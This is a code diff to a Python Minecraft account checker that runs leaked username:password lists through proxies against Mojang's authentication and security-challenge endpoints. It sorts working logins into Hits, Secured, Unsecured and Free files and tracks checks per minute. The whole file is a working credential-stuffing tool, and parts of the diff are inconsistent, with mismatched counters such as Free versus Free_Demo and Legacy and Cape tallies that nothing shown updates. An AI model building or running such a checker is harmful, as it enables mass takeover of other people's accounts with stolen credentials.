@@ -28,7 +28,7 @@ class status:
     wordlist = 0
     loaded_wordlist = 0
 
-#CPM
+#Checks per second
 class cpm:
     def __init__(self,start_timestamp):
         self.start_timestamp = start_timestamp
@@ -45,6 +45,13 @@ global cpm_counter
 cpm_counter = cpm(int(time.time()))
 
 
+#Title bar
+def updateTitle():
+    meow = int(cpm_counter.cpm())
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Minecraft Py v3.0 | Status: {status.wordlist}/{status.loaded_wordlist} Errors/Banned: {status.errors} CPM: {meow} | Hits: {status.Hits} Unsecured: {status.Unsecured} Secured: {status.Secured} Legacy: {status.Legacy} Cape: {status.Cape} Free: {status.Free}")
+    pass
+
+
 #Login Requests
 def login(q,proxies,log,proxy_type):
     while True:
@@ -58,16 +65,12 @@ def login(q,proxies,log,proxy_type):
             username = item[0]
             password = item[1]
             def login_function(username,password,proxy,proxy_type):
+                sess = requests.session()
 
-                ses = requests.Session()
-                
                 url = "https://authserver.mojang.com/authenticate"
-
                 data ={"agent":{"name":"Minecraft", "version":1}, "username":username, "password":password, "requestUser":"true"}
-
-                headers = {"Content-Type":"application/json", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Pragma":"no-cache", "Accept":"*/*"}
-
-                failkeys = ["errorMessage", "error", "Unexpected character", "JsonMappingException"]
+                headers = {"Content-Type":"application/json"}
+                failkeys = ["MethodNotAllowed","NotFound","ForbiddenOperationException","IllegalArgumentException", "IllegalArgumentException", "Unsupported MediaType"]
                 
                 if proxy != None:
                     proxy = requests_proxy(proxy, proxy_type)
@@ -75,7 +78,7 @@ def login(q,proxies,log,proxy_type):
                 rsp = ""
 
                 try:
-                    rsp = ses.post(url, json=data, headers=headers,proxies=proxy, timeout=timeout)
+                    rsp = sess.post(url, json=data, headers=headers,proxies=proxy, timeout=timeout)
                 #Errors status
                 except requests.ConnectionError:
                     status.errors += 1
@@ -86,37 +89,34 @@ def login(q,proxies,log,proxy_type):
                 except:
                     status.errors += 1
                     return False
-
                 try:
                     data = rsp.json()
                 except:
                     return False
-                        
+
                 if any(x in rsp.text for x in failkeys):
                     if log == 1:
                         print(colors.red + f" [Fail]: {username}:{password}")
                     return True
-                                
-                else:
+
+                elif 'selectedProfile' not in rsp.text:
                     print(colors.yellow + f" [Free]: {username}:{password}")
-                    results.Free(f"{username}:{password}")
-                    status.Free += 1
-                    if status.Free == 1 and times.timestamp == None:
+                    results.Free_Demo(f"{username}:{password} | Free ")
+                    status.Free_Demo += 1
+                    if status.Free_Demo == 1 and times.timestamp == None:
                         times.timestamp                    
                     updateTitle()                    
                     return True
-
+                else:
+                    pass
 
                 token = data['accessToken']
-
                 mcusername = data['selectedProfile']['name']
-
-                security = "https://api.mojang.com/user/security/challenges"
-
-                headersg = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Pragma":"no-cache", "Accept":"*/*", "Authorization":f"Bearer {token}"}
+                url2 = "https://api.mojang.com/user/security/challenges"
+                headers2 = {"Authorization":f"Bearer {token}"}
 
                 try:
-                    get_cap = ses.get(security, headers=headersg)
+                    rsp2 = sess.get(url2, headers=headers2)
                 #Errors status
                 except requests.ConnectionError:
                     status.errors += 1
@@ -128,30 +128,31 @@ def login(q,proxies,log,proxy_type):
                     status.errors += 1
                     return False
 
-                if 'answer' in get_cap.text:
-                    capture = 'Secured'
-                    results.Secured(f"{username}:{password} | Username: {mcusername} | {capture}")
+                if 'answer' in rsp2.text:
+                    print(colors.green + f" [Secured]: {username}:{password} | Username: {mcusername}")
+                    results.Secured(f"{username}:{password} | Username: {mcusername} | Secured")
                     status.Secured += 1
                     if status.Secured == 1 and times.timestamp == None:
                         times.timestamp                    
 
-                    results.Hits(f"{username}:{password} | Username: {mcusername} | {capture}")
+                    results.Hits(f"{username}:{password} | Username: {mcusername} | Secured")
                     status.Hits += 1
                     updateTitle()
                     return True
-
-                else:
-                    capture = 'Unsecured'
-                    print(colors.green + f" [Success]: {username}:{password} | Username: {mcusername} | {capture}")
-                    results.Unsecured(f"{username}:{password} | Username: {mcusername} | {capture}")
+                elif 'answer' not in rsp2.text:
+                    security = 'Unsecured'
+                    print(colors.cyan + f" [Unsecured]: {username}:{password} | Username: {mcusername}")
+                    results.Unsecured(f"{username}:{password} | Username: {mcusername} | Unsecured")
                     status.Unsecured += 1
                     if status.Unsecured == 1 and times.timestamp == None:
                         times.timestamp                    
 
-                    results.Hits(f"{username}:{password} | Username: {mcusername} | {capture}")
+                    results.Hits(f"{username}:{password} | Username: {mcusername} | Unsecured")
                     status.Hits += 1
                     updateTitle()
                     return True
+                else:
+                    pass
 
             #Errors
             proxy = None
@@ -187,13 +188,6 @@ if __name__ == "__main__":
         worker.start()
 
 
-    #Title bar
-    def updateTitle():
-        meow = int(cpm_counter.cpm())
-        ctypes.windll.kernel32.SetConsoleTitleW(f"Minecraft Py v2.0 | Status: {status.wordlist}/{status.loaded_wordlist} Errors/Banned: {status.errors} CPM: {meow} | Hits: {status.Hits} Unsecured: {status.Unsecured} Secured: {status.Secured} Free: {status.Free}")
-        pass
-
-
     #To join the queue thread until it's empty
     q.join()
 
@@ -204,6 +198,8 @@ if __name__ == "__main__":
     Hits: {status.Hits}
     Secured: {status.Secured}
     Unsecured: {status.Unsecured}
+    Legacy: {status.Legacy}
+    Capes: {status.Cape}
     Free: {status.Free}
     """)
 
